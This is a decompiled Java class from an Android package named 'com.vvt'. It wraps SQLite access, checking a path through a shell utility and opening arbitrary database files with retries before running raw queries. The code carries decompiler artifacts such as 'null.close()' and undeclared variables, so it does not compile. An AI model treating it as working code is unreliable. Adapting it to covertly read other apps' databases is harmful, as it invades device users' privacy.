package com.vvt.af.a;

import android.database.Cursor;
import android.os.Build.VERSION;
import android.os.SystemClock;
import com.vvt.shell.ShellUtil;

public class a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private android.database.sqlite.SQLiteDatabase c;
  private org.sqlite.database.sqlite.SQLiteDatabase d;
  
  static
  {
    System.loadLibrary("sqliteX");
  }
  
  public static a a(String paramString)
  {
    return a(paramString, 17);
  }
  
  public static a a(String paramString, int paramInt)
  {
    Object localObject1 = null;
    a locala = new com/vvt/af/a/a;
    locala.<init>();
    int i = Build.VERSION.SDK_INT;
    int j = 15;
    boolean bool;
    Object localObject2;
    if (i < j)
    {
      bool = a;
      if (bool) {}
      localObject2 = b(paramString, paramInt);
      locala.c = ((android.database.sqlite.SQLiteDatabase)localObject2);
      localObject2 = locala.c;
      if (localObject2 != null) {
        break label96;
      }
    }
    for (;;)
    {
      return (a)localObject1;
      bool = a;
      if (bool) {}
      localObject2 = d(paramString, paramInt);
      locala.d = ((org.sqlite.database.sqlite.SQLiteDatabase)localObject2);
      localObject2 = locala.d;
      if (localObject2 != null) {
        label96:
        localObject1 = locala;
      }
    }
  }
  
  public static a a(String paramString1, String paramString2)
  {
    Object localObject = null;
    boolean bool;
    if ((paramString1 == null) || (paramString2 == null))
    {
      bool = a;
      if (!bool) {}
    }
    for (;;)
    {
      return (a)localObject;
      String str = com.vvt.n.a.a(paramString1);
      if (str != null)
      {
        int j = 2;
        Object[] arrayOfObject = new Object[j];
        arrayOfObject[0] = str;
        bool = true;
        arrayOfObject[bool] = paramString2;
        localObject = String.format("%s/%s", arrayOfObject);
      }
      bool = a;
      if (bool) {}
      int i = 17;
      localObject = a((String)localObject, i);
    }
  }
  
  private static android.database.sqlite.SQLiteDatabase b(String paramString, int paramInt)
  {
    int i = 0;
    Object localObject = null;
    int k;
    if (paramString == null)
    {
      k = a;
      if (k == 0) {}
    }
    for (;;)
    {
      return (android.database.sqlite.SQLiteDatabase)localObject;
      k = ShellUtil.b(paramString);
      if (k != 0)
      {
        android.database.sqlite.SQLiteDatabase localSQLiteDatabase1 = c(paramString, paramInt);
        i = 5;
        localObject = localSQLiteDatabase1;
        k = i;
        while ((localObject == null) && (k > 0))
        {
          boolean bool = a;
          if (bool) {}
          long l = 1000L;
          SystemClock.sleep(l);
          android.database.sqlite.SQLiteDatabase localSQLiteDatabase2 = c(paramString, paramInt);
          int j = k + -1;
          k = j;
          localObject = localSQLiteDatabase2;
        }
      }
    }
  }
  
  private static android.database.sqlite.SQLiteDatabase c(String paramString, int paramInt)
  {
    android.database.sqlite.SQLiteDatabase localSQLiteDatabase = null;
    if (paramString != null) {
      bool = false;
    }
    try
    {
      localSQLiteDatabase = android.database.sqlite.SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = b;
        if ((!bool) || (0 != 0)) {
          null.close();
        }
      }
    }
    return localSQLiteDatabase;
  }
  
  private static org.sqlite.database.sqlite.SQLiteDatabase d(String paramString, int paramInt)
  {
    int i = 0;
    Object localObject = null;
    int k;
    if (paramString == null)
    {
      k = a;
      if (k == 0) {}
    }
    for (;;)
    {
      return (org.sqlite.database.sqlite.SQLiteDatabase)localObject;
      k = ShellUtil.b(paramString);
      if (k != 0)
      {
        org.sqlite.database.sqlite.SQLiteDatabase localSQLiteDatabase1 = e(paramString, paramInt);
        i = 5;
        localObject = localSQLiteDatabase1;
        k = i;
        while ((localObject == null) && (k > 0))
        {
          boolean bool = a;
          if (bool) {}
          long l = 1000L;
          SystemClock.sleep(l);
          org.sqlite.database.sqlite.SQLiteDatabase localSQLiteDatabase2 = e(paramString, paramInt);
          int j = k + -1;
          k = j;
          localObject = localSQLiteDatabase2;
        }
      }
    }
  }
  
  private static org.sqlite.database.sqlite.SQLiteDatabase e(String paramString, int paramInt)
  {
    org.sqlite.database.sqlite.SQLiteDatabase localSQLiteDatabase = null;
    if (paramString != null) {
      bool = false;
    }
    try
    {
      localSQLiteDatabase = org.sqlite.database.sqlite.SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = b;
        if ((!bool) || (0 != 0)) {
          null.close();
        }
      }
    }
    return localSQLiteDatabase;
  }
  
  public Cursor a(String paramString, String[] paramArrayOfString)
  {
    int i = Build.VERSION.SDK_INT;
    int j = 15;
    boolean bool;
    if (i < j)
    {
      bool = a;
      if (!bool) {}
    }
    for (Cursor localCursor = this.c.rawQuery(paramString, paramArrayOfString);; localCursor = this.d.rawQuery(paramString, paramArrayOfString))
    {
      return localCursor;
      bool = a;
      if (!bool) {}
    }
  }
  
  public Cursor a(String paramString1, String[] paramArrayOfString1, String paramString2, String[] paramArrayOfString2, String paramString3, String paramString4, String paramString5)
  {
    int i = Build.VERSION.SDK_INT;
    int j = 15;
    boolean bool;
    if (i < j)
    {
      bool = a;
      if (!bool) {}
    }
    for (Cursor localCursor = this.c.query(paramString1, paramArrayOfString1, paramString2, paramArrayOfString2, paramString3, paramString4, paramString5);; localCursor = this.d.query(paramString1, paramArrayOfString1, paramString2, paramArrayOfString2, paramString3, paramString4, paramString5))
    {
      return localCursor;
      bool = a;
      if (!bool) {}
    }
  }
  
  public Cursor a(String paramString1, String[] paramArrayOfString1, String paramString2, String[] paramArrayOfString2, String paramString3, String paramString4, String paramString5, String paramString6)
  {
    int i = Build.VERSION.SDK_INT;
    int j = 15;
    boolean bool;
    if (i < j)
    {
      bool = a;
      if (!bool) {}
    }
    for (Cursor localCursor = this.c.query(paramString1, paramArrayOfString1, paramString2, paramArrayOfString2, paramString3, paramString4, paramString5, paramString6);; localCursor = this.d.query(paramString1, paramArrayOfString1, paramString2, paramArrayOfString2, paramString3, paramString4, paramString5, paramString6))
    {
      return localCursor;
      bool = a;
      if (!bool) {}
    }
  }
  
  public void a()
  {
    int i = Build.VERSION.SDK_INT;
    int j = 15;
    boolean bool;
    Object localObject;
    if (i < j)
    {
      bool = a;
      if (bool) {}
      localObject = this.c;
      ((android.database.sqlite.SQLiteDatabase)localObject).close();
    }
    for (;;)
    {
      return;
      bool = a;
      if (bool) {}
      localObject = this.d;
      ((org.sqlite.database.sqlite.SQLiteDatabase)localObject).close();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/af/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */